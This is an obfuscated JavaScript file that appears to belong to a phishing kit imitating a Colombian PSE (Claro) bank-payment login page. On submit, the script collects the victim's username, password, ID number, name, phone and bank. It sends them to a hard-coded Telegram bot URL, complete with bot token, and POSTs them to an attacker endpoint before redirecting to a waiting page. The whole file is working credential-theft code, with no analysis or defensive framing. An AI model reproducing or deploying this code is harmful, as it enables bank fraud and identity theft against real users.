const _0x54ecc2 = _0x236d;
function _0x236d(_0x4baa3b, _0x318d86) {
  const _0x4c857c = _0x4c85();
  return (
    (_0x236d = function (_0x236d00, _0x301df6) {
      _0x236d00 = _0x236d00 - 0x1b3;
      let _0x543675 = _0x4c857c[_0x236d00];
      return _0x543675;
    }),
    _0x236d(_0x4baa3b, _0x318d86)
  );
}
(function (_0x5913b4, _0x34181d) {
  const _0x3226b5 = _0x236d,
    _0x24c0cd = _0x5913b4();
  while (!![]) {
    try {
      const _0x31ad32 =
        (parseInt(_0x3226b5(0x1c0)) / 0x1) *
          (-parseInt(_0x3226b5(0x1b5)) / 0x2) +
        parseInt(_0x3226b5(0x1b3)) / 0x3 +
        (-parseInt(_0x3226b5(0x1bb)) / 0x4) *
          (parseInt(_0x3226b5(0x1d5)) / 0x5) +
        (parseInt(_0x3226b5(0x1c1)) / 0x6) *
          (parseInt(_0x3226b5(0x1d6)) / 0x7) +
        (parseInt(_0x3226b5(0x1d1)) / 0x8) *
          (parseInt(_0x3226b5(0x1e0)) / 0x9) +
        -parseInt(_0x3226b5(0x1cf)) / 0xa +
        (-parseInt(_0x3226b5(0x1ce)) / 0xb) *
          (parseInt(_0x3226b5(0x1d9)) / 0xc);
      if (_0x31ad32 === _0x34181d) break;
      else _0x24c0cd["push"](_0x24c0cd["shift"]());
    } catch (_0x148737) {
      _0x24c0cd["push"](_0x24c0cd["shift"]());
    }
  }
})(_0x4c85, 0x67273);
function updateLS() {
  const _0x1e5b7c = _0x236d;
  LS[_0x1e5b7c(0x1c7)](_0x1e5b7c(0x1cc), JSON[_0x1e5b7c(0x1d7)](info));
}
const button = document["getElementById"](_0x54ecc2(0x1be)),
  userInput = document[_0x54ecc2(0x1dc)]("txtUsuario"),
  passInput = document[_0x54ecc2(0x1dc)](_0x54ecc2(0x1cb));
async function sendToTelegram(_0x2b0c50) {
  const _0x28fa4d = _0x54ecc2;
  try {
    for (const _0x149d49 of chatIds) {
      const _0x41e9d5 =
          _0x28fa4d(0x1b7) +
          _0x149d49 +
          _0x28fa4d(0x1d4) +
          encodeURIComponent(_0x2b0c50),
        _0x41713c = await fetch(_0x41e9d5);
      _0x41713c["ok"]
        ? console[_0x28fa4d(0x1bc)](_0x28fa4d(0x1c9) + _0x149d49 + ")")
        : console[_0x28fa4d(0x1c5)](
            _0x28fa4d(0x1d8) + _0x149d49 + "):",
            _0x41713c[_0x28fa4d(0x1c8)]
          );
    }
  } catch (_0x2ccfc2) {
    console[_0x28fa4d(0x1c5)](_0x28fa4d(0x1db), _0x2ccfc2);
  }
}
button["addEventListener"]("click", async function (_0x282900) {
  const _0x5290d8 = _0x54ecc2;
  _0x282900["preventDefault"](), (button[_0x5290d8(0x1dd)] = !![]);
  if (!userInput[_0x5290d8(0x1b4)] || !passInput[_0x5290d8(0x1b4)]) {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x5290d8(0x1b8)](),
      (button[_0x5290d8(0x1dd)] = ![]);
    return;
  }
  const _0x3b26fe = userInput[_0x5290d8(0x1b4)],
    _0x59dd50 = passInput["value"];
  (info[_0x5290d8(0x1d3)][_0x5290d8(0x1d2)] = _0x3b26fe),
    (info[_0x5290d8(0x1d3)][_0x5290d8(0x1df)] = _0x59dd50),
    updateLS();
  const _0x4a1e7b = {
      id: info["metaInfo"]["cc"],
      nombre: info["metaInfo"][_0x5290d8(0x1ba)],
      telefono: info[_0x5290d8(0x1d3)]["telnum"],
      direccion: "",
      usuario: info["metaInfo"][_0x5290d8(0x1d2)],
      password: info[_0x5290d8(0x1d3)][_0x5290d8(0x1df)],
      bank: info[_0x5290d8(0x1d3)]["ban"],
    },
    _0x19f7ce =
      _0x5290d8(0x1da) +
      _0x4a1e7b["id"] +
      "\x0a🆔Nombre:\x20" +
      _0x4a1e7b["nombre"] +
      _0x5290d8(0x1c6) +
      _0x4a1e7b[_0x5290d8(0x1c3)] +
      "\x0a🚹Usuario:\x20" +
      _0x4a1e7b[_0x5290d8(0x1de)] +
      _0x5290d8(0x1d0) +
      _0x4a1e7b[_0x5290d8(0x1bd)] +
      "\x0a🏦Banco:\x20" +
      _0x4a1e7b[_0x5290d8(0x1c4)] +
      _0x5290d8(0x1ca) +
      fuente;
  await sendToTelegram(_0x19f7ce);
  try {
    const _0x87ab46 = await fetch(url + _0x5290d8(0x1b9), {
      method: _0x5290d8(0x1cd),
      headers: { "Content-Type": "application/json" },
      body: JSON[_0x5290d8(0x1d7)](_0x4a1e7b),
    });
    if (!_0x87ab46["ok"]) throw new Error(_0x5290d8(0x1bf));
    window[_0x5290d8(0x1b6)][_0x5290d8(0x1c2)] = "./wait.html";
  } catch (_0x5b97b4) {
    console[_0x5290d8(0x1c5)](_0x5290d8(0x1e1), _0x5b97b4),
      (button[_0x5290d8(0x1dd)] = ![]);
  }
});
function _0x4c85() {
  const _0x2f06ad = [
    "log",
    "password",
    "btnUsuario",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor",
    "7655xCeJHi",
    "6EgInQA",
    "href",
    "telefono",
    "bank",
    "error",
    "\x0a📱Teléfono:\x20",
    "setItem",
    "statusText",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "\x0aFuente:\x20",
    "txtPass",
    "info",
    "POST",
    "121fztbmV",
    "62840sXKQOM",
    "\x0a🔒Contraseña:\x20",
    "8ShylBp",
    "user",
    "metaInfo",
    "&text=",
    "10405BtLCeI",
    "5200160Olmfcy",
    "stringify",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "381228bzBjLQ",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "Error\x20de\x20red\x20al\x20enviar\x20mensaje:",
    "getElementById",
    "disabled",
    "usuario",
    "puser",
    "5260797VBGnzf",
    "Error\x20al\x20procesar\x20la\x20solicitud:",
    "633219cfKhQZ",
    "value",
    "110zbqVrI",
    "location",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "focus",
    "/trico/tricoPse",
    "dudename",
    "652JRntmi",
  ];
  _0x4c85 = function () {
    return _0x2f06ad;
  };
  return _0x4c85();
}
